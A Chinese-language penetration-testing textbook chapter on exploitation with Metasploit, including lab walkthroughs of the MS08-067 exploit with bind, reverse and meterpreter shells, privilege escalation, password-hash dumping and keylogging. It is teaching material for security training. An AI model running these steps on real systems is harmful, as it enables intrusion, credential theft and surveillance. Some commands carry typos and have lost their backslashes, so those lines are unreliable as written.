# 第八章：目标利用

目标利用是一个让渗透测试与漏洞评估区分开的领域。现在漏洞已经被发现，你将通过利用系统来验证并利用这些漏洞，希望获得对目标网络和其中系统的完全控制或额外信息和可见性。本章将重点介绍和讨论用于进行真实世界利用的实践和工具。

在本章中，我们将涵盖以下主题：

+   在*漏洞研究*部分，我们将解释漏洞研究的哪些领域是至关重要的，以便在将其转化为实际利用代码之前了解、检查和测试漏洞。

+   我们将指引你到几个利用库，这些库应该让你了解公开可用的利用和何时使用它们。

+   我们将从目标评估的角度说明如何使用臭名昭著的利用工具包。这将让你清楚地了解如何利用目标以获取敏感信息。*高级利用工具包*部分包括一些实际操作的练习。

+   最后，我们将尝试简要描述为 Metasploit 编写一个简单利用模块的步骤。

从头开始编写利用代码可能是一项耗时且昂贵的任务。因此，使用公开可用的利用并调整它们以适应你的目标环境可能需要专业知识，这将帮助你将一个利用的骨架转化为另一个，如果相似性和目的几乎相同的话。我们强烈鼓励在你自己的实验室中练习使用公开可用的利用，以进一步了解并开始编写你自己的利用代码。

# 漏洞研究

理解特定软件或硬件产品的能力可能为调查该产品可能存在的漏洞提供一个起点。进行漏洞研究并不容易，也不是一键式的任务。因此，它需要一个强大的知识基础和不同的因素来进行安全分析：

+   **编程技能**：这是道德黑客的基本因素。学习任何编程语言中存在的基本概念和结构应该能让测试人员在发现漏洞时获得优势。除了对编程语言的基本了解外，你必须准备好处理处理器、系统内存、缓冲区、指针、数据类型、寄存器和缓存的高级概念。这些概念可以在几乎任何编程语言中实现，比如 C/C++、Python、Perl 和汇编语言。

要了解从发现的漏洞编写利用代码的基础知识，请访问[`www.phreedom.org/presentations/exploit-code-development/exploit-code-development.pdf`](http://www.phreedom.org/presentations/exploit-code-development/exploit-code-development.pdf)。

+   **逆向工程**：这是发现电子设备、软件或系统可能存在的漏洞的另一个广泛领域，通过分析其功能、结构和操作来实现。其目的是在没有任何关于其内部工作的先前知识的情况下从给定系统中推导出代码；检查其错误条件、设计不良的功能和协议；以及测试边界条件。有几个原因可以使用逆向工程技能，比如从软件中去除版权保护、安全审计、竞争技术情报、识别专利侵权、互操作性、理解产品工作流程和获取敏感数据。逆向工程为审查应用程序的代码增加了两个概念层次：源代码审计和二进制审计。如果你可以访问应用程序的源代码，你可以通过自动化工具完成安全分析；或者手动研究源代码以提取漏洞可能被触发的条件。另一方面，二进制审计简化了没有任何源代码的应用程序的逆向工程任务。反汇编器和反编译器是两种可能协助审计员进行二进制分析的通用工具类型。反汇编器从编译的二进制程序生成汇编代码，而反编译器从编译的二进制程序生成高级语言代码。然而，使用这些工具中的任何一个都是非常具有挑战性的，并需要仔细评估。

+   **仪器化工具**：仪器化工具，如调试器、数据提取器、模糊测试器、性能分析器、代码覆盖率、流分析器和内存监视器，在发现漏洞的过程中发挥着重要作用，并为测试目的提供一致的环境。解释每个工具类别超出了本书的范围。然而，你可能会发现几个有用的工具已经存在于 Kali Linux 中。为了跟踪最新的逆向代码工程工具，我们强烈建议你访问在线图书馆[`www.woodmann.com/collaborative/tools/index.php/Category:RCE_Tools`](http://www.woodmann.com/collaborative/tools/index.php/Category:RCE_Tools)。

+   **利用性和有效载荷构造**：这是为应用程序的一个易受攻击的元素编写**概念验证**（**PoC**）代码的最后一步，这可以允许渗透测试人员在目标机器上执行自定义命令。我们将从逆向工程阶段对易受攻击的应用程序的知识应用到用编码机制打磨 shellcode，以避免可能导致利用过程终止的不良字符。

根据发现的漏洞的类型和分类，遵循特定的策略非常重要，这可能允许你在目标系统上执行任意代码或命令。作为一名专业的渗透测试人员，你将始终寻找可能导致获取对目标操作系统的 shell 访问的漏洞。因此，我们将在本章的后面部分演示一些使用 Metasploit 框架的场景，展示这些工具和技术。

# 漏洞和利用库

多年来，已经在公共领域报告了许多漏洞。其中一些是披露了 PoC 利用代码，以证明特定软件或应用中发现的漏洞的可行性和可行性。许多仍然未得到解决。在这个竞争激烈的时代，寻找公开可用的利用和漏洞信息使渗透测试人员能够快速搜索和检索最佳的利用，以适应其目标系统环境。您还可以将一种类型的利用移植到另一种类型（例如，从 Win32 架构到 Linux 架构），前提是您具有中级编程技能和对特定操作系统架构的清晰理解。我们提供了一组在线存储库，可以帮助您通过搜索来跟踪任何漏洞信息或其利用。

并非所有发现的漏洞都已在互联网上向公众披露。有些是报告的，但没有任何 PoC 利用代码，有些甚至没有提供详细的漏洞信息。因此，咨询多个在线资源是许多安全审计人员的常见做法。

以下是在线存储库的列表：

| 存储库名称 | 网站网址 |
| --- | --- |
| Bugtraq SecurityFocus | [`www.securityfocus.com`](http://www.securityfocus.com) |
| OSVDB Packet Storm 漏洞 | [`blog.osvdb.org/`](https://blog.osvdb.org/) |
| Packet Storm | [`www.packetstormsecurity.org`](http://www.packetstormsecurity.org) |
| 国家漏洞数据库 | [`nvd.nist.gov`](http://nvd.nist.gov) |
| IBM ISS X-Force | [`exchange.xforce.ibmcloud.com/`](https://exchange.xforce.ibmcloud.com/) |
| 美国计算机紧急响应小组漏洞注释 | [`www.kb.cert.org/vuls`](http://www.kb.cert.org/vuls) |
| 美国计算机紧急响应小组警报 | [`www.us-cert.gov/cas/techalerts/`](http://www.us-cert.gov/cas/techalerts/) |
| SecuriTeam | [`www.securiteam.com`](http://www.securiteam.com) |
| Secunia 公告 | [`secunia.com/advisories/historic/`](http://secunia.com/advisories/historic/) |
| CXSecurity.com | [`cxsecurity.com`](http://cxsecurity.com) |
| XSSed XSS-漏洞 | [`www.xssed.com`](http://www.xssed.com) |
| 安全漏洞数据库 | [`securityvulns.com`](http://securityvulns.com) |
| SEBUG | [`www.sebug.net`](http://www.sebug.net) |
| MediaService Lab | [`techblog.mediaservice.net`](http://techblog.mediaservice.net) |
| 智能利用聚合网络 | [`www.intelligentexploit.com`](http://www.intelligentexploit.com) |

虽然还有许多其他互联网资源可用，但我们只列出了一些经过审查的资源。 Kali Linux 集成了 Offensive Security 的 Exploit 数据库。这提供了额外的优势，可以在系统上保持所有存档的利用以供将来参考和使用。要访问 Exploit-DB，请在 shell 上执行以下命令：

```
 # cd /usr/share/exploitdb/
    # vim files.csv 
```

这将在`/usr/share/exploitdb/platforms/`目录下打开当前可用的 Exploit-DB 的完整利用列表。这些利用根据系统类型（Windows、Linux、HP-UX、Novell、Solaris、BSD、IRIX、TRU64、ASP、PHP 等）分类在其相关的子目录中。大多数这些利用是使用 C、Perl、Python、Ruby、PHP 和其他编程技术开发的。 Kali Linux 已经配备了一些支持执行这些利用的编译器和解释器。

我们如何从利用列表中提取特定信息？

利用 Bash 命令的威力，您可以操纵任何文本文件的输出，以检索有意义的数据。您可以使用 Searchsploit，或者在控制台上键入`cat files.csv |cut -d"," -f3`来实现。它将从`files.csv`文件中提取利用标题的列表。要了解基本的 shell 命令，请参阅[`tldp.org/LDP/abs/html/index.html`](http://tldp.org/LDP/abs/html/index.html)。

# 先进的利用工具包

Kali Linux 预装了一些最好和最先进的利用工具包。Metasploit 框架（[`www.metasploit.com`](http://www.metasploit.com)）就是其中之一。在这里，我们详细解释了它，并提出了一些场景，这些场景将增加其生产力，并增强您对渗透测试的体验。该框架是用 Ruby 编程语言开发的，并支持模块化，使得渗透测试人员更容易扩展或开发自定义插件和工具。框架的架构分为三个广泛的类别：库、接口和模块。我们的重点是关注各种接口和模块的功能。接口（控制台、CLI、Web 和 GUI）基本上提供了前端操作活动，处理任何类型的模块（利用、有效载荷、辅助工具、编码器和 NOP）时。以下每个模块都有其自己的含义，并且对于渗透测试过程具有特定功能：

+   **利用**：这个模块是为了利用目标系统中的特定漏洞而开发的 PoC 代码

+   **有效载荷**：这个模块是恶意代码，作为利用的一部分或独立编译，用于在目标系统上运行任意命令

+   **辅助工具**：这些模块是一组用于执行扫描、嗅探、拨号、指纹识别和其他安全评估任务的工具

+   **编码器**：这些模块用于在渗透操作期间对有效载荷进行编码，以规避杀毒软件、防火墙、IDS/IPS 和其他类似恶意软件防御的检测

+   **无操作或无操作执行（NOP）**：这个模块是汇编语言指令，通常添加到 shellcode 中，什么也不做，只是为了覆盖一致的有效载荷空间

为了让您了解，我们将解释两个众所周知的 Metasploit 接口的基本用法及其相关的命令行选项。每个接口都有其自己的优势和劣势。但是，我们强烈建议您坚持使用控制台版本，因为它支持大部分框架功能。

# MSFConsole

MSFConsole 是渗透测试人员最有效、强大和一体化的前端界面之一，用于充分利用利用框架。要访问`msfconsole`，请转到应用程序 | 利用工具 | Metasploit，或使用终端执行以下命令：

```
 # msfconsole 
```

您将进入一个交互式控制台界面。要了解所有可用命令，您可以输入以下命令：

```
 msf> help 
```

这将显示两组命令；一组将广泛用于整个框架，另一组将特定于存储评估参数和结果的数据库后端。关于其他使用选项的说明可以通过在核心命令后使用`-h`来获取。让我们来看看`show`命令的用法：

```
 msf> show -h
    [*] Valid parameters for the "show" command are: all, encoders,  nops, exploits, payloads, auxiliary, plugins, options
    [*] Additional module-specific parameters are: advanced, evasion,  targets, actions 
```

此命令通常用于显示给定类型的可用模块，或所有模块。最常用的命令可能是以下之一：

+   `show auxiliary`：此命令将显示所有辅助模块。

+   `show exploits`：此命令将获取框架内所有利用的列表。

+   `show payloads`：此命令将检索所有平台的有效载荷列表。但是，在所选利用的上下文中使用相同的命令将仅显示兼容的有效载荷。例如，Windows 有效载荷只会与兼容 Windows 的利用一起显示。

+   `show encoders`：此命令将打印可用编码器的列表。

+   `shownops`：此命令将显示所有可用的 NOP 生成器。

+   `show options`：此命令将显示特定模块的设置和选项。

+   显示目标：此命令将帮助我们提取特定利用模块支持的目标操作系统列表。

+   `show advanced`：此命令将为您提供更多选项来微调您的利用执行。

我们已经编制了以下表中最有价值的命令的简短列表；您可以使用 Metasploit 控制台练习每一个。命令旁边的斜体术语将需要您提供：

| **命令** | **描述** |
| --- | --- |
| `check` | 验证特定利用针对您的易受攻击目标而不利用它。这个命令不被许多利用支持。 |
| `connectip port` | 类似于 Netcat 和 Telnet 工具。 |
| `exploit` | 启动所选的利用。 |
| `run` | 启动所选的辅助。 |
| `jobs` | 列出当前正在运行的所有后台模块，并提供终止它们的能力。 |
| `route add subnet netmasksessionid` | 为通过受损会话进行网络枢纽目的的流量添加路由。 |
| `info module` | 显示有关特定模块（利用、辅助等）的详细信息。 |
| `setparam value` | 配置当前模块内的参数值。 |
| `setgparam value` | 在框架中全局设置参数值，以供所有利用和辅助模块使用。 |
| `unsetparam` | 它是`set`命令的反向。您也可以使用`unset all`命令一次重置所有变量。 |
| `unsetgparam` | 取消设置一个或多个全局变量。 |
| `sessions` | 能够显示、交互和终止目标会话。使用`-l`进行列出，使用`-i` ID 进行交互，使用`-k` ID 进行终止。 |
| `search string` | 通过模块名称和描述提供搜索功能。 |
| `use module` | 在渗透测试环境中选择特定模块。 |

我们将在接下来的部分演示一些这些命令的实际用法。重要的是要理解它们在框架内不同模块集的基本用法。

# MSFCLI

与 MSFConsole 界面一样，CLI 提供了各种模块的广泛覆盖，可以在任何一个实例中启动。但是，它缺少 MSFConsole 的一些高级自动化功能。

要访问`msfcli`，请使用终端执行以下命令：

```
 # msfcli -x 
```

这将显示所有可用模式，类似于 MSFConsole，并提供选择特定模块和设置其参数的用法说明。请注意，所有变量或参数都应遵循`param=value`的约定，并且所有选项都区分大小写。我们提供了一个小练习来选择和执行特定的利用：

```
 # msfcli windows/smb/ms08_067_netapi O
    [*] Please wait while we load the module tree...

       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       RHOST                     yes       The target address
       RPORT    445              yes       Set the SMB service port
    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER,  SRVSVC) 
```

在前面命令的末尾使用`O`指令框架显示所选利用的可用选项。以下命令使用`RHOST`参数设置目标 IP：

```
 # msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.7 P
    [*] Please wait while we load the module tree...

    Compatible payloads
    ===================

       Name                             Description
       ----                             -----------
    generic/debug_trap               Generate a debug trap in the target process
    generic/shell_bind_tcp           Listen for a connection and spawn a command shell
    ... 
```

最后，在使用`RHOST`参数设置目标 IP 之后，是时候选择兼容的有效载荷并执行我们的利用了：

```
 # msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.7 LHOST=192.168.0.3 PAYLOAD=windows/shell/reverse_tcp E
    [*] Please wait while we load the module tree...
    [*] Started reverse handler on 192.168.0.3:4444
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (240 bytes) to 192.168.0.7
    [*] Command shell session 1 opened (192.168.0.3:4444 -> 192.168.0.7:1027)

    Microsoft Windows XP [Version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.

    C:WINDOWSsystem32> 
```

正如你所看到的，我们在为所选有效载荷设置`LHOST`参数后，已经获得了对目标机器的本地 shell 访问。

# 忍者 101 训练

本节提供的示例将阐明您对利用框架进行各种方式的理解。不可能涵盖每一个方面，或者使用 Metasploit 框架，但我们已经仔细研究并提取了最重要的功能供您练习。要深入了解 Metasploit 框架，我们强烈建议您阅读在线教程*Metasploit Unleashed*，网址为[`www.offensive-security.com/metasploit-unleashed/`](http://www.offensive-security.com/metasploit-unleashed/)。该教程包含了来自渗透测试角度的高级材料，包括有关利用开发、漏洞研究和评估技术的见解。

# 场景 1

在这个练习中，我们将演示如何利用 Metasploit 框架进行端口扫描、操作系统指纹识别和服务识别，使用集成的 Nmap 工具。在 MSFConsole 上，执行以下命令：

```
 msf> load db_tracker
    [*] Successfully loaded plugin: db_tracker 
```

如果遇到数据库连接错误，可以使用以下两个命令：

`Systemclt start postgresql`

`Msfdb inint`

数据库跟踪器将保存会话获取的数据以供进一步使用。要开始 Nmap 扫描，请输入以下内容：

```
    msf>db_nmap -T Aggressive -sV -n -O -v 192.168.0.7 Starting Nmap 5.00 ( http://nmap.org ) at 2010-11-11 22:34 UTC NSE: Loaded 3 scripts for scanning. Initiating ARP Ping Scan at 22:34 Scanning 192.168.0.7 [1 port] Completed ARP Ping Scan at 22:34, 0.00s elapsed (1 total hosts) Initiating SYN Stealth Scan at 22:34 Scanning 192.168.0.7 [1000 ports] Discovered open port 445/tcp on 192.168.0.7 Discovered open port 135/tcp on 192.168.0.7 Discovered open port 25/tcp on 192.168.0.7 Discovered open port 139/tcp on 192.168.0.7 Discovered open port 3389/tcp on 192.168.0.7 Discovered open port 80/tcp on 192.168.0.7 Discovered open port 443/tcp on 192.168.0.7 Discovered open port 21/tcp on 192.168.0.7 Discovered open port 1025/tcp on 192.168.0.7 Discovered open port 1433/tcp on 192.168.0.7 Completed SYN Stealth Scan at 22:34, 3.04s elapsed (1000 total ports) Initiating Service scan at 22:34
    Scanning 10 services on 192.168.0.7
    Completed Service scan at 22:35, 15.15s elapsed (10 services on 1 host)
    Initiating OS detection (try #1) against 192.168.0.7
    ...
    PORT     STATE SERVICE       VERSION
    21/tcpopen  ftp           Microsoft ftpd
    25/tcpopen  smtp          Microsoft ESMTP 6.0.2600.2180
    80/tcpopen  http          Microsoft IIS httpd 5.1
    135/tcp  openmsrpc         Microsoft Windows RPC
    139/tcp  opennetbios-ssn
    443/tcp  open  https?
    445/tcp  openmicrosoft-ds  Microsoft Windows XP microsoft-ds
    1025/tcpopen  msrpc         Microsoft Windows RPC
    1433/tcpopen  ms-sql-s      Microsoft SQL Server 2005 9.00.1399; RTM
    3389/tcpopen  microsoft-rdp Microsoft Terminal Service
    MAC Address: 00:0B:6B:68:19:91 (WistronNeweb)
    Device type: general purpose
    Running: Microsoft Windows 2000|XP|2003
    OS details: Microsoft Windows 2000 SP2 - SP4, Windows XP SP2 - SP3, or Windows Server 2003 SP0 - SP2
    Network Distance: 1 hop
    TCP Sequence Prediction: Difficulty=263 (Good luck!)
    IP ID Sequence Generation: Incremental
    Service Info: Host: custdesk; OS: Windows
    ...
    Nmap done: 1 IP address (1 host up) scanned in 20.55 seconds
               Raw packets sent: 1026 (45.856KB) | Rcvd: 1024 (42.688KB)

```

此时，我们已成功扫描了目标并将结果保存在当前数据库会话中。要列出发现的目标和服务，您可以分别使用`db_hosts`和`db_services`命令。此外，如果您已经单独使用 Nmap 程序扫描了目标并将结果保存为 XML 格式，您可以使用`db_import_nmap_xml`命令将这些结果导入 Metasploit。

# 场景 2

在这个例子中，我们将说明 Metasploit 框架中的一些辅助功能。关键是要理解它们在漏洞分析过程中的重要性。

# SMB 用户名

该模块将对目标 IP 地址进行扫描，尝试查找与**服务器消息块**（**SMB**）相关联的用户名。该服务用于应用程序访问文件共享、打印机或网络设备之间的通信。使用 Metasploit 辅助扫描器之一，我们可以确定可能的用户名。

首先，通过输入以下内容在 Metasploit 中搜索扫描器：

```
 msf> search SMB 
```

然后，我们可以看到用于扫描开放 SMB 服务的不同扫描器的数量：

![](img/3dab00b7-fa86-49c8-89fe-d537d2bc740b.png)

要使用扫描器，请输入以下内容：

```
 msf> use auxiliary/scanner/smb/smb_enumershares 
```

将`RHOSTS`参数设置为网络范围，即`192.168.0.1/24`，输入以下内容：

```
 msf> set RHOSTS 192.168.0.1/24 
```

然后，输入以下内容：

```
 msf> run 
```

扫描结果表明有一个带有`METASPLOITABLE`用户名的 SMB 服务正在运行：

![](img/3a9213aa-2a64-426c-a5cf-e9a889b71620.png)

这可能表明存在可以被攻击的共享或其他网络服务。当我们开始破解用户凭据和密码时，`METASPLOIT`用户名也可以为我们提供一个起点。

# VNC 空白认证扫描器

该模块将扫描 IP 地址范围内的**虚拟网络计算**（**VNC**）服务器，这些服务器可以在没有任何认证详细信息的情况下访问：

```
 msf> use auxiliary/scanner/vnc/vnc_none_auth
    msf auxiliary(vnc_none_auth) > show options
    msf auxiliary(vnc_none_auth) > set RHOSTS 10.4.124.0/24
    RHOSTS => 10.4.124.0/24
    msf auxiliary(vnc_none_auth) > run
    [*] 10.4.124.22:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] 10.4.124.23:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] 10.4.124.25:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] Scanned 026 of 256 hosts (010% complete)
    [*] 10.4.124.26:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] 10.4.124.27:5900, VNC server security types supported : None,  free access!
    [*] 10.4.124.28:5900, VNC server security types supported : None,  free access!
    [*] 10.4.124.29:5900, VNC server protocol version : "RFB 004.000",  not supported!
    ...
    [*] 10.4.124.224:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] 10.4.124.225:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] 10.4.124.227:5900, VNC server security types supported : None,  free access!
    [*] 10.4.124.228:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] 10.4.124.229:5900, VNC server protocol version : "RFB 004.000",  not supported!
    [*] Scanned 231 of 256 hosts (090% complete)
    [*] Scanned 256 of 256 hosts (100% complete)
    [*] Auxiliary module execution completed 
```

请注意，我们发现了一些可以在没有认证的情况下访问的 VNC 服务器。如果没有启用授权控制，这种攻击向量可能对系统管理员构成严重威胁，并且可能轻易地邀请来自互联网的不受欢迎的访客访问您的 VNC 服务器。

# PostGRESQL 登录

在之前的章节中，我们在对 Metasploitable 操作系统进行 Nmap 扫描时发现了运行在端口`5432`上的 PostgreSQL 数据库服务：

![](img/ba867ce8-b274-4ebc-bc5b-2f435f5455c7.png)

我们可以利用 Metasploit 辅助扫描器来确定数据库的登录信息。首先，我们通过输入以下内容来配置 Metasploit 来使用扫描器：

```
 msf> use auxiliary/scanner/postgres/postgres_login
```

接下来，我们想要配置两个选项。第一个选项设置扫描器继续扫描，即使它找到了成功的登录。这使我们能够扫描多个数据库实例，并枚举许多用户名和密码。我们通过输入以下内容来配置这个选项：

```
 msf> set STOP_ON_SUCCESS true 
```

其次，我们设置要扫描的主机。扫描器将采用 CIDR 范围或单个 IP 地址。在这种情况下，我们将把扫描器指向`192.168.0.30`上的 Metasploitable OS，因为我们在 Nmap 扫描中已经确定在该 IP 地址上有一个活动实例。我们通过输入以下内容来设置这一点：

```
 msf> set RHOSTS 192.168.0.30
```

然后我们运行利用程序。当我们检查输出时，我们可以看到该数据库的用户名和密码已被找到：

![](img/53efbb30-f0b7-4273-921e-3fcf0f6b65c4.png)

数据库安全对组织至关重要，因为数据库通常包含机密信息。诸如 PostgreSQL 之类的扫描器使我们能够以高效的方式测试组织的核心机密信息周围的安全性。

# 情景 3

现在我们将探讨一些常见负载（绑定、反向和 Meterpreter），并从利用的角度讨论它们的功能。这个练习将让你了解何时以及如何使用特定的负载。

# 绑定 shell

绑定 shell 是一种远程 shell 连接，它在成功利用和执行 shellcode 设置绑定端口监听器后提供对目标系统的访问。这为攻击者打开了一个通道，使其能够使用 Netcat 等工具在绑定 shell 端口上连接回受损机器，从而可以通过 TCP 连接隧道传输标准输入（stdin）和输出（stdout）。这种情况的工作方式类似于 Telnet 客户端建立到 Telnet 服务器的连接，并且适用于攻击者位于**网络地址转换**（**NAT**）或防火墙之后，无法从受损主机直接联系攻击者 IP 的环境。

以下是开始利用和设置绑定 shell 的命令：

```
 msf> use exploit/windows/smb/ms08_067_netapi
    msf exploit(ms08_067_netapi) > show options
    msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7
    RHOST => 192.168.0.7
    msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/bind_tcp
    PAYLOAD => windows/shell/bind_tcp
    msf exploit(ms08_067_netapi) > exploit

    [*] Started bind handler
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (240 bytes) to 192.168.0.7
    [*] Command shell session 1 opened (192.168.0.3:41289 -> 192.168.0.7:4444) at Sat Nov 13 19:01:23 +0000 2010
    Microsoft Windows XP [Version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.

    C:WINDOWSsystem32> 
```

因此，我们已经分析了 Metasploit 也自动化了使用集成的多负载处理程序连接到绑定 shell 的过程。在编写自己的利用程序并使用绑定 shellcode 时，Netcat 等工具可以派上用场，这需要第三方处理程序来建立到受损主机的连接。您可以在[`en.wikipedia.org/wiki/Netcat`](http://en.wikipedia.org/wiki/Netcat)上阅读有关 Netcat 在各种网络安全操作中的实际用例。

# 反向 shell

反向 shell 是绑定 shell 的完全相反。它不是在目标系统上绑定端口并等待来自攻击者机器的连接，而是简单地连接回攻击者的 IP 和端口，并生成一个 shell。反向 shell 的一个显著特点是考虑到目标位于 NAT 或防火墙之后，阻止公共访问其系统资源。

以下是开始利用和设置反向 shell 的命令：

```
 msf> use exploit/windows/smb/ms08_067_netapi
    msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7
    RHOST => 192.168.0.7
    msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/reverse_tcp
    PAYLOAD => windows/shell/reverse_tcp
    msf exploit(ms08_067_netapi) > show options
    msf exploit(ms08_067_netapi) > set LHOST 192.168.0.3
    LHOST => 192.168.0.3
    msf exploit(ms08_067_netapi) > exploit

    [*] Started reverse handler on 192.168.0.3:4444
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (240 bytes) to 192.168.0.7
    [*] Command shell session 1 opened (192.168.0.3:4444 -> 192.168.0.7:1027) at Sat Nov 13 22:59:02 +0000 2010
    Microsoft Windows XP [Version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.

    C:WINDOWSsystem32> 
```

您可以通过攻击者的 IP 清楚地区分反向 shell 和绑定 shell。在反向 shell 配置中，我们必须提供攻击者的 IP（例如，`LHOST` `192.168.0.3`），而在绑定 shell 中则不需要提供。

内联和分段负载之间有什么区别？内联负载是一个单独的自包含 shellcode，它将在一次利用实例中执行，而分段负载创建了攻击者和受害者机器之间的通信通道，以读取其余分段 shellcode 以执行特定任务。选择分段负载是常见做法，因为它们比内联负载要小得多。

# Meterpreters

meterpreter 是一种高级、隐秘、多面的、动态可扩展的有效载荷，通过将反射式 DLL 注入目标内存来操作。脚本和插件可以在运行时动态加载，以扩展后期利用活动的目的。这包括提权、转储系统帐户、键盘记录、持久后门服务和启用远程桌面。此外，整个 meterpreter shell 的通信默认情况下是加密的。

以下是开始利用和设置 meterpreter 有效载荷的命令：

```
 msf> use exploit/windows/smb/ms08_067_netapi
    msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7
    RHOST => 192.168.0.7
    msf exploit(ms08_067_netapi) > show payloads
    ...
    msf exploit(ms08_067_netapi) > set PAYLOAD  windows/meterpreter/reverse_tcp
    PAYLOAD => windows/meterpreter/reverse_tcp
    msf exploit(ms08_067_netapi) > show options
    ...
    msf exploit(ms08_067_netapi) > set LHOST 192.168.0.3
    LHOST => 192.168.0.3
    msf exploit(ms08_067_netapi) > exploit

    [*] Started reverse handler on 192.168.0.3:4444
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (749056 bytes) to 192.168.0.7
    [*] Meterpreter session 1 opened (192.168.0.3:4444 -> 192.168.0.7:1029) at Sun Nov 14 02:44:26 +0000 2010
    meterpreter> help
    ... 
```

正如您所看到的，我们已成功获得了 meterpreter shell。通过输入，我们将能够看到各种可用于我们的命令。让我们检查我们当前的特权，并使用名为`getsystem`的 meterpreter 脚本将它们提升到`SYSTEM`级别：

```
    meterpreter>getuid
    Server username: CUSTDESKsalesdept
    meterpreter> use priv
    meterpreter>getsystem -h
    ...
```

这将显示提升我们特权的技术数量。通过使用默认命令`getsystem`，不带任何选项，它将针对目标尝试每种技术，并在成功时立即停止：

```
 meterpreter>getsystem
    ...got system (via technique 1).
    meterpreter>getuid
    Server username: NT AUTHORITYSYSTEM
    meterpreter>sysinfo
    Computer: CUSTDESK
    OS      : Windows XP (Build 2600, Service Pack 2).
    Arch    : x86
    Language: en_US 
```

如果您选择执行`-j -z`利用命令，则将利用执行推送到后台，并且不会出现交互式 meterpreter shell。但是，如果会话已成功建立，那么您可以使用会话`-i`ID 与特定会话进行交互，或者通过键入会话`-l`获取活动会话的列表以获取确切的 ID 值。

让我们利用 meterpreter shell 的功能，并使用以下命令转储目标持有的当前系统帐户和密码。这些将以 NTLM 哈希格式显示，并可以通过使用以下命令的几种工具和技术来破解：

```
 meterpreter> run hashdump
    [*] Obtaining the boot key...
    [*] Calculating the hboot key using SYSKEY 71e52ce6b86e5da0c213566a1236f892...
    [*] Obtaining the user list and keys...
    [*] Decrypting user keys...
    [*] Dumping password hashes...
    h
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    HelpAssistant:1000:d2cd5d550e14593b12787245127c866d:d3e35f657c924d0b31eb811d2d986df9:::
    SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:c8edf0d0db48cbf7b2835ec013cfb9c5:::
    Momin Desktop:1003:ccf9155e3e7db453aad3b435b51404ee:3dbde697d71690a769204beb12283678:::
    IUSR_MOMINDESK:1004:a751dcb6ea9323026eb8f7854da74a24:b0196523134dd9a21bf6b80e02744513:::
    ASPNET:1005:ad785822109dd077027175f3382059fd:21ff86d627bcf380a5b1b6abe5d8e1dd:::
    IWAM_MOMINDESK:1009:12a75a1d0cf47cd0c8e2f82a92190b42:c74966d83d519ba41e5196e00f94e113:::
    h4x:1010:ccf9155e3e7db453aad3b435b51404ee:3dbde697d71690a769204beb12283678:::
    salesdept:1011:8f51551614ded19365b226f9bfc33fab:7ad83174aadb77faac126fdd377b1693::: 
```

现在，让我们通过使用 meterpreter shell 的键盘记录功能，使用以下命令将此活动进一步记录下来，这可能会从我们的目标中揭示一些有用的数据：

```
 meterpreter>getuid
    Server username: NT AUTHORITYSYSTEM
    meterpreter>ps
    Process list
    ============

     PID   Name              Arch  Session  User                           Path
     ---   ----              ----  -------  ----                           ----
     0     [System Process]
     4     System            x86   0        NT AUTHORITYSYSTEM
     384   smss.exe          x86   0        NT AUTHORITYSYSTEM            SystemRootSystem32smss.exe
     488   csrss.exe         x86   0        NT AUTHORITYSYSTEM            ??C:WINDOWSsystem32csrss.exe
     648   winlogon.exe      x86   0        NT AUTHORITYSYSTEM            ??C:WINDOWSsystem32winlogon.exe
     692   services.exe      x86   0        NT AUTHORITYSYSTEM            C:WINDOWSsystem32services.exe
     704   lsass.exe         x86   0        NT AUTHORITYSYSTEM            C:WINDOWSsystem32lsass.exe
    ...
    148   alg.exe           x86   0        NT AUTHORITYLOCAL SERVICE     C:WINDOWSSystem32alg.exe
    3172  explorer.exe      x86   0        CUSTDESKsalesdept C:WINDOWSExplorer.EXE
    3236  reader_sl.exe     x86   0        CUSTDESKsalesdept C:Program FilesAdobeReader 9.0ReaderReader_sl.exe 
```

在这个阶段，我们将将 meterpreter shell 迁移到`explorer.exe`进程（`3172`），以便使用以下命令开始记录系统上当前用户的活动：

```
 meterpreter> migrate 3172
    [*] Migrating to 3172...
    [*] Migration completed successfully.
    meterpreter>getuid
    Server username: CUSTDESKsalesdept
    meterpreter>keyscan_start
    Starting the keystroke sniffer... 
```

我们现在已经启动了我们的键盘记录器，应该等一段时间来获取记录的数据块：

```
 meterpreter>keyscan_dump
    Dumping captured keystrokes...
    <Return> www.yahoo.com <Return><Back> www.bbc.co.uk <Return>
    meterpreter>keyscan_stop
    Stopping the keystroke sniffer... 
```

